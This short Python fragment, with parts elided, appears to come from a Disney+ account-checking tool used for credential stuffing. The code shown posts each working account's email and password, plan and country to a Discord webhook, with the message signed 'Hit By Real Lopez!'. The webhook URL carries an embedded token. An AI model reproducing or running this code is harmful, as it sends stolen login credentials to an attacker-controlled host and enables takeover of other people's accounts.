    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                content = f"# Nova Conta"
                webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1177496965907480636/z6xCL1agnF1lw3VpBD-KUo327gznFQXBC-ATlQsbdT_-iJGzVnBy7_xZYN9wTKMNXRlc", content=content)
                embed = DiscordEmbed(title="Disney+", description=f" {email}:{password} | {plan} | País: {country} | Hit By Real Lopez!", color="03b2f8")
